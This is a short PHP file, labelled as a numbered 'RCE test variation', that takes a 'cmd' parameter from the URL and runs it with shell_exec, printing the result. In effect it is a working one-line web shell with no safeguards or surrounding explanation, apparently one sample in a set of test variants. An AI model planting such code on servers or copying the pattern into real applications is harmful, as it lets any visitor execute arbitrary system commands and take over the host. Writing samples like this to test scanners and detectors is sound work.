<?php
// RCE test variation #736
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>